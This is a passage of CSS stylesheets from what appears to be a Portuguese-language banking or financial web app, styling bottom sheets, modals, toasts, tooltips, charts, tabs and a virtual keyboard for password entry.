         box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
         background: white;
         width: 100vw;
         max-height: 100vh;
         overflow: scroll; }
         .bottom-sheet__content.show {
         bottom: 0;
         -webkit-transition: bottom 0.5s;
         transition: bottom 0.5s;
         opacity: 1; }
         .bottom-sheet__content.hide {
         bottom: -100%;
         -webkit-transition: bottom 0.5s, opacity 0s 0.5s;
         transition: bottom 0.5s, opacity 0s 0.5s;
         opacity: 0; }
         .bottom-sheet__header {
         display: -webkit-box;
         display: flex;
         position: fixed;
         -webkit-box-align: start;
         align-items: flex-start;
         z-index: 1;
         border-bottom: 3px solid #e0e0e0;
         background: white;
         padding: 20px;
         width: 100%; }
         .bottom-sheet__title {
         margin: 0;
         margin-left: 26px;
         text-align: left;
         line-height: 24px;
         font-size: 16px;
         font-weight: 900; }
         .bottom-sheet__title:before {
         position: absolute;
         -webkit-transform: rotate(-45deg);
         transform: rotate(-45deg);
         -webkit-transition: 0.25s;
         transition: 0.25s;
         margin-top: 4px;
         margin-left: -24px;
         border: solid #1e1e1f;
         border-width: 0 0 2px 2px;
         border-radius: 2px;
         cursor: pointer;
         padding: 4px;
         content: ""; }
         .bottom-sheet__body {
         margin: 80px 10px 0; }
         .bottom-sheet__footer {
         margin: 10px -10px 0;
         background: #f2f2f2;
         padding: 10px;
         color: #706f6f;
         font-size: 12px; }
         .has-bottom-sheet {
         position: relative;
         overflow: hidden; }
      </style>
      <style type="text/css">.circle-chart {
         position: relative; }
         @-webkit-keyframes circle-chart-fill {
         to {
         stroke-dasharray: 100 100; } }
         @keyframes circle-chart-fill {
         to {
         stroke-dasharray: 100 100; } }
         @-webkit-keyframes show-ball {
         100% {
         opacity: 1; }
         60% {
         opacity: 0; }
         0% {
         opacity: 0; } }
         @keyframes show-ball {
         100% {
         opacity: 1; }
         60% {
         opacity: 0; }
         0% {
         opacity: 0; } }
         @-webkit-keyframes rotate-ball {
         to {
         -webkit-transform: rotate(0);
         transform: rotate(0); } }
         @keyframes rotate-ball {
         to {
         -webkit-transform: rotate(0);
         transform: rotate(0); } }
         .circle-chart__base {
         -webkit-transform: scaleX(-1) rotate(-90deg);
         transform: scaleX(-1) rotate(-90deg); }
         .circle-chart__base--background {
         stroke-width: 0.8;
         stroke: #e0e0e0; }
         .circle-chart__base--circle {
         animation: circle-chart-fill 2s reverse ease-in-out;
         stroke: #3ecf7a;
         stroke-width: 0.8;
         stroke-linecap: "round"; }
         .circle-chart__ball {
         position: absolute;
         top: 0;
         animation: rotate-ball 2s reverse ease-in-out;
         fill: #3ecf7a;
         stroke: #fff;
         stroke-width: 0.5; }
         .ie .circle-chart__base--circle, .ie .circle-chart__ball {
         -webkit-animation: show-ball 1s;
         animation: show-ball 1s; }
         .edge .circle-chart__ball {
         -webkit-animation: show-ball 2.5s;
         animation: show-ball 2.5s; }
      </style>
      <style type="text/css">.collapsible__container .collapsible__header {
         margin-top: -1px;
         border: 1px solid #e0e0e0;
         cursor: pointer;
         width: 100%; }
         .collapsible__container .collapsible__toggle {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding: 16px 0;
         width: 100%;
         text-align: left; }
         .collapsible__container .collapsible__toggle .collapsible__title {
         margin-left: 20px;
         width: 90%; }
         .collapsible__container .collapsible__toggle .collapsible-arrow {
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         -webkit-transition: 0.25s;
         transition: 0.25s;
         margin-right: 20px;
         outline: none;
         border: solid #000;
         border-width: 2px 2px 0 0;
         cursor: pointer;
         padding: 4px;
         width: 10px;
         height: 10px; }
         .collapsible__container .collapsible__toggle .collapsible-arrow--expanded {
         -webkit-transform: rotate(135deg) translateY(-5px);
         transform: rotate(135deg) translateY(-5px);
         margin-top: -10px; }
      </style>
      <style type="text/css">.loader {
         position: relative; }
         .loader .loader__bubble {
         display: none; }
         .loader .loader__content {
         display: block; }
         .loader--show .loader__bubble {
         display: block; }
         .loader--show .loader__content {
         display: none; }
         .loader--show button {
         text-indent: -9999px; }
         .loader--show .loader__invisibility-cloak > * {
         visibility: hidden !important; }
         .loader--inverse .loader__bubble > div {
         background-color: black; }
         .loader--white .loader__bubble > div {
         background-color: white; }
         .loader__bubble {
         position: absolute;
         top: 50%;
         left: 50%;
         margin-top: -7px;
         margin-left: -21px;
         font-size: 0; }
         .loader__bubble > div:nth-child(1) {
         -webkit-animation-delay: 0.2s;
         animation-delay: 0.2s; }
         .loader__bubble > div:nth-child(2) {
         -webkit-animation-delay: 0.4s;
         animation-delay: 0.4s; }
         .loader__bubble > div:nth-child(3) {
         -webkit-animation-delay: 0.6s;
         animation-delay: 0.6s; }
         .loader__bubble > div {
         display: inline-block;
         -webkit-animation-fill-mode: both;
         animation-fill-mode: both;
         -webkit-transform: scale(0.1);
         transform: scale(0.1);
         margin: 2px;
         border-radius: 100%;
         background-color: #fff;
         -webkit-animation: loader 0.55s ease-in-out infinite alternate;
         animation: loader 0.55s ease-in-out infinite alternate;
         width: 10px;
         height: 10px; }
         @-webkit-keyframes loader {
         to {
         -webkit-transform: scale(1);
         transform: scale(1);
         opacity: 1; } }
         @keyframes loader {
         to {
         -webkit-transform: scale(1);
         transform: scale(1);
         opacity: 1; } }
      </style>
      <style type="text/css">.mensagem-informativa {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 0;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         background-color: #f2f2f2;
         padding: 10px 15px;
         color: #706f6f; }
         .mensagem-informativa .mensagem-informativa__icon {
         margin-right: 15px; }
         .mensagem-informativa .mensagem-informativa__icon svg {
         width: 18px;
         height: 18px; }
         .mensagem-informativa .mensagem-informativa__message {
         text-align: left;
         text-transform: none;
         line-height: 15px;
         letter-spacing: 0.01em;
         font-size: 14px;
         font-weight: 400;
         font-style: normal; }
         .mensagem-informativa--error .mensagem-informativa {
         background-color: #cf3e3e;
         color: #fff; }
         .mensagem-informativa--error .mensagem-informativa .mensagem-informativa__message {
         line-height: 24px; }
      </style>
      <style type="text/css">.modal-overlay {
         position: fixed;
         top: -5000px;
         right: -5000px;
         bottom: -5000px;
         left: -5000px;
         -webkit-backface-visibility: hidden;
         backface-visibility: hidden;
         background: rgba(0, 0, 0, 0.8); }
         .modal-wrapper {
         display: -webkit-box;
         display: flex;
         position: fixed;
         top: 0;
         right: 0;
         bottom: 0;
         left: 0;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-backface-visibility: hidden;
         backface-visibility: hidden;
         overflow: hidden; }
         .has-modal {
         position: relative;
         overflow: hidden; }
         .has-modal.block-background {
         height: 100%; }
         modal,
         .modal {
         position: relative;
         margin: 20px;
         border-radius: 3px;
         box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
         background: #fff;
         padding: 50px 40px 40px;
         width: 400px;
         height: auto;
         pointer-events: all; }
         modal .modal__footer,
         .modal .modal__footer {
         margin: 27px -40px -40px;
         background: #f2f2f2;
         padding: 30px 40px;
         color: #706f6f;
         font-size: 12px; }
         .modal.modal--large {
         width: 650px; }
         .modal.modal--medium {
         width: 450px; }
         .modal__title {
         margin-bottom: 30px;
         text-transform: lowercase;
         line-height: 32px;
         font-size: 28px;
         font-weight: 300;
         font-style: italic; }
         .modal__actions > * {
         margin-right: 20px; }
         .modal__actions > *:last-child {
         margin-right: 0; }
         .modal__actions--right {
         text-align: right; }
         .modal__actions--full-width {
         display: -webkit-box;
         display: flex; }
         .modal__actions--full-width > * {
         -webkit-box-flex: 1;
         flex: 1;
         width: 100%; }
         .modal__actions--full-width .button {
         width: 100%; }
         .modal__content {
         margin-bottom: 50px; }
         .modal__close {
         position: absolute;
         top: -12px;
         right: -12px;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
         background-color: black;
         cursor: pointer;
         width: 24px;
         height: 24px;
         vertical-align: middle;
         text-align: center;
         line-height: 24px;
         color: #fff; }
         .modal__icon {
         display: inline-block;
         margin-bottom: 10px;
         width: 60px;
         height: 60px; }
         .modal__icon-title {
         margin-bottom: 10px;
         text-transform: lowercase;
         font-size: 24px;
         font-weight: 700; }
         .modal--error .modal__icon,
         .modal--error .modal__icon-title {
         color: #cf3e3e; }
         .modal--success .modal__icon,
         .modal--success .modal__icon-title {
         color: #3ecf7a; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .safari .modal.modal--form {
         margin: -45% 10px 10px 10px; } }
         @media (max-width: 767px) {
         modal,
         .modal {
         margin: 10px;
         padding: 20px; }
         modal .modal__footer,
         .modal .modal__footer {
         margin: 10px -20px -20px;
         padding: 20px; }
         .modal__close {
         top: -7px;
         right: -7px; }
         .modal__title {
         margin-bottom: 20px;
         font-size: 20px; }
         .modal__title br {
         display: none; } }
      </style>
      <style type="text/css">.recaptcha-badge {
         display: none; }
      </style>
      <style type="text/css">.select-input .select-box {
         border: 0;
         border-bottom: 1px solid #1e1e1f;
         border-radius: 0;
         width: 100%;
         overflow: inherit;
         color: #acacac; }
         .select-input .select-box .select__text--value {
         color: #1e1e1f; }
         .select-input .select-box .select__label--selected {
         position: absolute;
         top: -20px;
         -webkit-transition-duration: 0.2s;
         transition-duration: 0.2s;
         -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
         transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
         color: #706f6f;
         font-size: 12px; }
         .select-input--no-padding .select {
         padding: 0; }
         .select-input--no-padding .select:after {
         right: 0; }
         .select-input--error .select-box {
         border-bottom-color: #cf3e3e; }
      </style>
      <style type="text/css">.label {
         display: inline-block;
         border-radius: 3px;
         background-color: #1e1e1f;
         padding: 3px 15px;
         text-transform: uppercase;
         color: #fff;
         font-size: 10px; }
         .label.success {
         background-color: #3ecf7a; }
         .label.error {
         background-color: #cf3e3e; }
      </style>
      <style type="text/css">tab-set,
         tab-body,
         tab-header,
         tab-body-item,
         tab-header-item {
         display: block;
         width: 100%; }
         .tab-set--wizard .tab-header-item--active a {
         border-bottom: 1px solid #e0e0e0; }
         .tab-set--wizard tab-header-item a {
         position: relative;
         border-radius: 0;
         cursor: default; }
         .tab-set--wizard tab-header-item a, .tab-set--wizard tab-header-item a:after {
         -webkit-transition: background-color 350ms linear;
         transition: background-color 350ms linear; }
         .tab-set--wizard tab-header-item:first-child a {
         border-radius: 3px 0 0 0; }
         .tab-set--wizard tab-header-item:last-child a {
         border-radius: 0 3px 0 0; }
         .tab-set--wizard tab-header-item:not(:last-child) a:after {
         position: absolute;
         right: -16px;
         -webkit-transform: rotate(45deg) skew(10deg, 10deg);
         transform: rotate(45deg) skew(10deg, 10deg);
         z-index: 2;
         border: 1px solid #e0e0e0;
         border-bottom: none;
         border-left: none;
         background-color: #f2f2f2;
         content: "";
         width: 30px;
         height: 30px; }
         .tab-set--wizard tab-header-item:not(:last-child) .tab-header-item--active a:after {
         background-color: #fff; }
         .tab-header {
         display: -webkit-box;
         display: flex;
         margin: 0;
         list-style: none; }
         .tab-header-item {
         -webkit-box-flex: 1;
         flex: 1 1 auto; }
         .tab-header-item a {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         background-color: #f2f2f2;
         padding: 8px;
         width: 100%;
         height: 50px;
         text-align: center;
         text-decoration: none;
         line-height: 1em;
         font-size: 16px;
         border: 1px solid #e0e0e0;
         border-right: none;
         border-radius: 3px 3px 0 0; }
         .tab-header-item a:last-child {
         border-right: 1px solid #e0e0e0; }
         .tab-header-item__title {
         margin: 0;
         font-size: inherit;
         font-weight: inherit; }
         .tab-header-item__subtitle {
         display: block;
         line-height: 1em;
         font-size: 10px;
         font-weight: 300; }
         .tab-header-item:not(.tab-header-item--active),
         .tab-header-item:not(.tab-header-item--active) .text-themed {
         color: #acacac; }
         .tab-header-item--active a {
         border-bottom: none;
         background-color: #fff;
         font-weight: 700; }
         .tab-body {
         margin-bottom: 30px; }
         .tab-panel {
         background-color: #fff; }
         .tab-body hr {
         margin: 0;
         border-color: #e0e0e0; }
         .ie .tab-set--wizard tab-header-item:not(:last-child) a:after {
         top: 9px; }
         @media (min-width: 1024px) {
         .tab-body .tab-panel {
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 1.25rem 1.25rem; }
         .tab-body .tab-panel:last-child {
         border-radius: 0 0 3px 3px; }
         .tab-body .tab-panel:not(:last-child) {
         border-bottom: none; }
         .tab-body .tab-panel.tab-panel--no-header {
         border-top: 1px solid #e0e0e0;
         border-radius: 3px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .tab-body .tab-panel {
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 1.125rem 1.125rem; }
         .tab-body .tab-panel:last-child {
         border-radius: 0 0 3px 3px; }
         .tab-body .tab-panel:not(:last-child) {
         border-bottom: none; }
         .tab-body .tab-panel.tab-panel--no-header {
         border-top: 1px solid #e0e0e0;
         border-radius: 3px; } }
         @media (max-width: 767px) {
         .tab-body .tab-panel {
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 0.625rem 0.625rem; }
         .tab-body .tab-panel:last-child {
         border-radius: 0 0 3px 3px; }
         .tab-body .tab-panel:not(:last-child) {
         border-bottom: none; }
         .tab-body .tab-panel.tab-panel--no-header {
         border-top: 1px solid #e0e0e0;
         border-radius: 3px; } }
         @media (max-width: 767px) {
         .tab-set--wizard tab-header-item:not(:last-child) a:after {
         right: -13px;
         -webkit-transform: rotate(45deg) skew(25deg, 25deg);
         transform: rotate(45deg) skew(25deg, 25deg);
         background-color: #f2f2f2;
         width: 24px;
         height: 24px; } }
      </style>
      <style type="text/css">.virtual-keyboard {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         justify-content: space-around;
         margin: 0;
         padding: 0;
         padding-bottom: 20px;
         overflow: hidden;
         list-style: none; }
         .virtual-keyboard__key {
         margin-bottom: 10px;
         width: calc(100% * (1 / 3) - 10px); }
         .virtual-keyboard__key .button {
         padding: 0;
         white-space: nowrap;
         font-weight: 700; }
         .virtual-keyboard__key__value:not(:last-child):after {
         content: " ou "; }
         .virtual-keyboard__key--backspace button {
         position: relative; }
         .virtual-keyboard__key--backspace svg {
         position: absolute;
         top: 50%;
         left: 50%;
         margin-top: -10px;
         margin-left: -15px;
         width: 30px;
         height: 20px; }
         .virtual-keyboard__key--backspace .button:focus:active span {
         position: static; }
         .input-password-bullet {
         padding-left: 0 !important;
         text-align: center;
         letter-spacing: 5px;
         font-size: 2.5rem-rem-calc(1)/2; }
      </style>
      <style type="text/css">.textarea-input textarea {
         margin-top: 5px;
         outline: none;
         padding-top: 0;
         min-height: 0;
         max-height: 59px;
         overflow: hidden;
         resize: none; }
         .textarea-input.error .textarea-input__counter {
         color: #cf3e3e; }
         .textarea-input.error .textfield__input {
         border-bottom-color: #cf3e3e; }
         .textarea-input.error .textfield__input + .field-message {
         visibility: visible; }
         .textarea-input .textfield--textarea .field-message {
         display: none; }
         .textarea-input .textarea-input__counter {
         position: absolute;
         top: 18px;
         right: 3px;
         color: #706f6f;
         font-size: 12px; }
         .textarea-input .textarea-input__counter.textarea-input__counter--ativo {
         -webkit-animation: up 0.1s linear forwards;
         animation: up 0.1s linear forwards; }
      </style>
      <style type="text/css">.toast-container {
         display: block;
         position: fixed;
         top: 10%;
         right: 7%;
         z-index: 10003; }
         .toast {
         display: -webkit-box;
         display: flex;
         margin-bottom: 15px;
         border-radius: 3px;
         box-shadow: 0 1px 6px rgba(0, 0, 0, 0.64);
         padding: 10px;
         width: 350px; }
         .toast--alert {
         background-color: #cf3e3e;
         color: white; }
         .toast--success {
         background-color: #3ecf7a;
         color: white; }
         .toast--warning {
         background-color: #1e1e1f;
         color: white; }
         .toast__icon {
         -webkit-box-flex: 0;
         flex: 0 1 auto;
         margin: 6px 0 0 6px;
         width: 24px;
         height: 24px; }
         .toast__text {
         -webkit-box-flex: 1;
         flex: 1 1 0%;
         opacity: 0.8;
         margin: 10px 15px; }
         .toast__text p {
         margin: 0;
         text-transform: lowercase;
         line-height: 1.25;
         font-size: 16px;
         font-weight: 300;
         font-weight: 400; }
         .toast__close-button {
         -webkit-box-flex: 0;
         flex: 0 1 auto; }
         .toast__close-button button {
         outline: none;
         cursor: pointer;
         line-height: 10px;
         color: inherit;
         font-size: 25px; }
         .toast-animation {
         position: relative;
         z-index: 1; }
         .toast-animation.ng-enter {
         -webkit-transition: 0.5s;
         transition: 0.5s;
         opacity: 0;
         margin-top: 100px; }
         .toast-animation.ng-enter-active {
         opacity: 1;
         margin-top: 0; }
         .toast-animation.ng-leave {
         -webkit-transition: 0.5s;
         transition: 0.5s;
         opacity: 1;
         margin-top: 0; }
         .toast-animation.ng-leave-active {
         opacity: 0;
         z-index: 0;
         margin-top: -100px; }
         @media (max-width: 767px) {
         .toast-container {
         right: auto;
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%);
         width: 90%; }
         .toast {
         width: 100%; } }
      </style>
      <style type="text/css">.tooltip__link-info {
         display: inline-block;
         width: 15px;
         height: 15px; }
         .tooltip-link-click {
         position: relative;
         color: #1e1e1f; }
         .tooltip-link {
         position: absolute;
         -webkit-transition: opacity 0.25s ease, right 0.25s ease;
         transition: opacity 0.25s ease, right 0.25s ease;
         visibility: hidden;
         opacity: 0;
         z-index: 5;
         line-height: 20px;
         font-size: 14px;
         font-weight: normal;
         font-style: initial; }
         .tooltip-link__small .tooltip-link__content {
         width: 180px; }
         .tooltip-link__medium .tooltip-link__content {
         width: 300px; }
         .tooltip-link__large .tooltip-link__content {
         width: 384px; }
         .tooltip-link__content {
         position: absolute;
         border: 1px solid #e0e0e0;
         border-radius: 10px;
         box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.3);
         background-color: #fff;
         padding: 10px;
         width: 100%;
         max-width: 95vw; }
         .tooltip-link__content p {
         line-height: 20px;
         font-size: 12px; }
         .tooltip-link__content p:last-child {
         margin-bottom: 0; }
         .tooltip-link__content .tooltip-link__arrow {
         position: absolute;
         border: transparent;
         border-width: 1px;
         border-style: solid;
         border-right-color: #e0e0e0;
         border-bottom-color: #e0e0e0;
         background-color: #fff;
         width: 15px;
         height: 15px; }
         .tooltip-link__left .tooltip-link__content {
         left: -20px;
         -webkit-transform: translate(-100%, -50%);
         transform: translate(-100%, -50%);
         margin-top: 12px; }
         .tooltip-link__left .tooltip-link__content .tooltip-link__arrow {
         top: 50%;
         right: 0;
         -webkit-transform: translate(50%, -50%) rotate(-45deg);
         transform: translate(50%, -50%) rotate(-45deg); }
         .tooltip-link__top {
         left: 0; }
         .tooltip-link__top .tooltip-link__content {
         bottom: 7px; }
         .tooltip-link__top .tooltip-link__content .tooltip-link__arrow {
         -webkit-transform: translate(0, 25%) rotate(45deg);
         transform: translate(0, 25%) rotate(45deg); }
         .tooltip-link__top-center {
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); }
         .tooltip-link__top-center .tooltip-link__content {
         bottom: 7px; }
         .tooltip-link__top-center .tooltip-link__content .tooltip-link__arrow {
         left: 50%;
         -webkit-transform: translate(-50%, 25%) rotate(45deg);
         transform: translate(-50%, 25%) rotate(45deg); }
         .tooltip-open .tooltip-link {
         visibility: visible;
         opacity: 1; }
      </style>
      <style type="text/css">@media only screen and (min-width: 769px) {
         .tooltip--right .tooltip__box {
         padding: 0; }
         .tooltip--right .tooltip__box .tooltip__box-content {
         right: auto;
         left: 35px; }
         .tooltip--right .tooltip__box .tooltip__box-content:before {
         right: auto;
         left: -21px;
         border-right-width: 0.75rem;
         border-right-style: solid;
         border-color: transparent white transparent transparent; }
         .tooltip--right .tooltip__box .tooltip__box-content:after {
         right: auto;
         left: -21px;
         border-color: transparent #acacac transparent transparent; } }
         .tooltip__box {
         position: relative;
         cursor: default;
         padding: 0 0 10px 20px; }
         .tooltip__box .tooltip__box-link {
         cursor: pointer !important;
         width: 20px;
         height: 20px; }
         .tooltip__box .tooltip__box-link-title {
         border: 1px solid #acacac;
         color: #acacac; }
         .tooltip__box:hover .tooltip__box-content {
         visibility: visible;
         opacity: 1;
         line-height: 20px;
         font-size: 12px; }
         @media only screen and (min-width: 768px) {
         .tooltip__box:hover .tooltip__box-content {
         right: 100%; } }
         .tooltip__box .tooltip__box-content {
         top: 40px;
         right: 90%;
         -webkit-transition: opacity 0.25s ease, right 0.25s ease;
         transition: opacity 0.25s ease, right 0.25s ease;
         visibility: hidden;
         -webkit-opacity: 0;
         -ms-opacity: 0;
         opacity: 0;
         border: 1px solid #e0e0e0;
         border-radius: 7px;
         box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.3);
         background-color: #fff;
         width: calc(100vw - (2 * 13px));
         max-width: none;
         color: #1e1e1f;
         font-size: 12px;
         font-weight: 400; }
         @media only screen and (min-width: 768px) {
         .tooltip__box .tooltip__box-content {
         top: -20px;
         width: 350px; }
         .tooltip__box .tooltip__box-content:before {
         display: block;
         top: 30px;
         bottom: auto;
         left: 100%;
         border: 0.75rem inset;
         border-right-width: 0;
         border-left-style: solid;
         border-color: transparent transparent #fff;
         width: 0;
         height: 0;
         content: ""; }
         .tooltip__box .tooltip__box-content:after {
         display: block;
         position: absolute;
         top: 30px;
         bottom: auto;
         left: 100%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         border: inset 0.84rem;
         border-right-width: 0;
         border-left-style: solid;
         border-color: transparent transparent #e0e0e0;
         width: 0;
         height: 0;
         content: ""; } }
         .tooltip__box .tooltip__box-content:before {
         top: 18px;
         right: -9px;
         left: auto;
         -webkit-transform: translateX(0);
         transform: translateX(0);
         z-index: 2;
         border-color: transparent transparent transparent white; }
         .tooltip__box .tooltip__box-content:after {
         display: block;
         position: absolute;
         top: 30px;
         right: -21px;
         left: auto;
         z-index: 1;
         border: 10px solid transparent;
         border-left-style: solid;
         border-color: transparent transparent transparent #e0e0e0;
         width: 0;
         height: 0;
         content: ""; }
         .tooltip__box .tooltip__box-content button,
         .tooltip__box .tooltip__box-content a.button {
         float: right; }
         @media only screen and (min-width: 768px) and (max-width: 998px) {
         .tooltip__box {
         margin-top: -5px;
         padding: 10px; }
         .tooltip__box .tooltip__box-link {
         -webkit-transform: scale(1.2);
         transform: scale(1.2);
         -webkit-transform-origin: center;
         transform-origin: center; }
         .tooltip__box .tooltip__box-link svg {
         margin: 0 auto; }
         .tooltip__box .tooltip__box-content {
         top: -11px;
         right: 110%; }
         .tooltip__box:hover .tooltip__box-content {
         right: 110%; } }
         @media only screen and (max-width: 767px) {
         .block__header-title .block__header-tooltip {
         right: -15px; }
         .tooltip__box {
         margin-top: -5px;
         padding: 10px; }
         .tooltip__box .tooltip__box-link {
         -webkit-transform: scale(1.2);
         transform: scale(1.2);
         -webkit-transform-origin: center;
         transform-origin: center; }
         .tooltip__box .tooltip__box-link svg {
         margin: 0 auto; }
         .tooltip__box .tooltip__box-content {
         top: 55px;
         right: 1px; }
         .tooltip__box .tooltip__box-content:after {
         top: 105px;
         left: 8px;
         border-color: #e0e0e0 transparent transparent; }
         .tooltip__box .tooltip__box-content:before {
         top: 101px;
         left: 6px;
         right: auto;
         -webkit-transform: translateX(0);
         transform: translateX(0);
         border-top-width: 10px;
         transform: rotate(180deg);
         -ms-transform: rotate(180deg);
         -webkit-transform: rotate(180deg);
         -moz-transform: rotate(180deg);
         border-color: transparent transparent white; }
         .tooltip__box:hover .tooltip__box-content {
         top: -110px;
         left: 0;
         z-index: 2; } }
         @media only screen and (max-device-width: 998px) {
         .tooltip__box:hover .tooltip__box-content {
         visibility: hidden;
         opacity: 0; }
         .tooltip__box.hovered .tooltip__box-content {
         visibility: visible !important;
         opacity: 1 !important; } }
         @media only screen and (max-device-width: 767px) {
         .tooltip__box:hover .tooltip__box-content {
         visibility: hidden;
         opacity: 0; }
         .tooltip__box.hovered .tooltip__box-content {
         visibility: visible !important;
         opacity: 1 !important; } }
      </style>
      <style type="text/css">.tag-desconto {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         border-radius: 5px;
         background-color: #3ecf7a;
         padding: 3px 5px; }
         .tag-desconto .valor {
         margin: 0;
         line-height: 1;
         color: white;
         font-weight: bold; }
         .tag-desconto i {
         margin-right: 5px;
         width: 18px;
         height: 18px;
         color: white; }
      </style>
      <style type="text/css">.textfield-label--uppercase label {
         text-transform: uppercase; }
         .textfield-label--regularcase label {
         text-transform: none; }
         .textfield--hide-error {
         margin-bottom: 10px; }
         .textfield--hide-error .field-message {
         display: none; }
      </style>
      <style type="text/css">.circular-chart {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100px; }
         .circular-chart .chart__svg {
         width: 100px;
         height: 100px;
         overflow: visible !important; }
         .circular-chart .chart__text,
         .circular-chart .chart__currency {
         display: block;
         line-height: 16px;
         font-size: 12px; }
         .circular-chart .chart__text {
         color: #1e1e1f;
         font-weight: 300; }
         .circular-chart .chart__currency {
         color: #706f6f;
         font-weight: 700; }
         .circular-chart .chart__bar {
         stroke-width: 5px;
         stroke-linecap: round;
         fill: none;
         stroke-dashoffset: 314.1592px;
         stroke-dasharray: 314.1592px; }
         .circular-chart .chart__bar0 {
         -webkit-transition: all 2s ease;
         transition: all 2s ease;
         stroke: #3ecf7a;
         stroke-dashoffset: 0; }
         .circular-chart .chart__bar1 {
         stroke: #e0e0e0; }
         .circular-chart .chart__bar2 {
         stroke: #acacac; }
         .circular-chart .chart__inside {
         position: absolute;
         top: 50%;
         left: 0;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         width: 100%;
         text-align: center;
         font-size: 12px;
         font-weight: 300; }
         .linear-chart .chart__bar,
         .linear-chart .chart__fill {
         display: block;
         border-radius: 3px;
         height: 4px; }
         .linear-chart .chart__bar {
         background-color: #e0e0e0;
         width: 100%; }
         .linear-chart .chart__fill {
         -webkit-transition: all 1s ease;
         transition: all 1s ease;
         background-color: #acacac;
         width: 0; }
      </style>
      <style type="text/css">.copy-proxy--value {
         display: none; }
         .ie .copy-proxy--value,
         .edge .copy-proxy--value {
         display: block;
         position: absolute;
         left: -2000px; }
      </style>
      <style type="text/css">.property .property__label {
         color: #706f6f; }
         .property .property__value {
         color: #1e1e1f;
         font-weight: 700; }
         .property .property__additional-value {
         color: #acacac;
         font-size: 14px; }
         .property .property__additional-value strong {
         color: #1e1e1f; }
         .property .property__additional-value .highlighted {
         font-style: italic; }
         .property .property__subtitle {
         color: #706f6f;
         font-size: 13px; }
         .property .property__subtitlestrong {
         color: #1e1e1f; }
         .property.property--large-font .property__label {
         font-size: 16px; }
         .property.property--large-font .property__value {
         font-size: 20px; }
         .property.property--large-font .property__additional-value {
         font-size: 16px; }
         .property.property--large-font .property__subtitle {
         font-size: 13px; }
         .property.property--small-font .property__label {
         font-size: 14px; }
         .property.property--small-font .property__value {
         font-size: 16px; }
         .property.property--small-font .property__additional-value {
         font-size: 14px; }
         .property.property--small-font .property__subtitle {
         font-size: 13px; }
         .property--small-icon {
         display: -webkit-box;
         display: flex;
         align-content: flex-start;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-flow: row;
         flex-wrap: wrap; }
         .property--small-icon .property__icon {
         -webkit-box-ordinal-group: 3;
         order: 2;
         margin-right: 7.5px;
         width: 21px;
         height: 21px; }
         .property--small-icon .property__label {
         -webkit-box-ordinal-group: 2;
         order: 1;
         width: 100%; }
         .property--small-icon .property__value {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex-grow: 1;
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .property--small-icon .property__subtitle {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex-grow: 1;
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .property--large-icon {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .property--large-icon .property__icon {
         margin-top: -5px;
         margin-right: 15px;
         width: 32px;
         height: 32px; }
         @media (max-width: 767px) {
         .property .property__value {
         letter-spacing: -0.5px; }
         .property.property--small-font .property__label {
         font-size: 13px; }
         .property.property--small-font .property__value {
         font-size: 16px; }
         .property.property--small-font .property__additional-value {
         font-size: 13px; }
         .property.property--small-font .property__subtitle {
         font-size: 13px; } }
      </style>
      <style type="text/css">.tag-label {
         margin: 2px 0 0 5px;
         border-width: 1px;
         border-style: solid;
         border-radius: 10px;
         padding: 0 10px;
         text-transform: lowercase;
         line-height: 18px;
         font-size: 12px;
         font-weight: 500; }
         .tag-label.tag-label--outline {
         border-color: #cf3e3e;
         color: #cf3e3e; }
         .tag-label.tag-label--outline.label--gray {
         border-color: #706f6f;
         color: #706f6f; }
         .tag-label.tag-label--solid {
         border-color: #acacac;
         background-color: #acacac;
         color: #fff; }
         .tag-label.tag-label--icon {
         padding-left: 7px; }
         @media (max-width: 1023px) {
         .tag-label.tag-label--icon {
         padding: 0 4px; } }
         .tag-label div {
         display: inline-block; }
         .label-adicional .tag-label.tag-label--solid {
         margin-left: 3px;
         border: none;
         background: none;
         padding-left: 0;
         color: #706f6f;
         font-size: 14px;
         font-weight: 400; }
         .label-adicional .tag-label.tag-label--solid .tag-label__icon {
         margin-right: 3px;
         width: 10px;
         height: 10px; }
         .tag-label__icon {
         width: 9px;
         height: 9px; }
      </style>
      <style type="text/css">/**
         * @license AngularJS v1.2.0
         * (c) 2015 Lifely
         * License: MIT
         */
         .ng-carousel {
         display: block;
         width: 100%;
         white-space: nowrap;
         position: relative;
         overflow: hidden; }
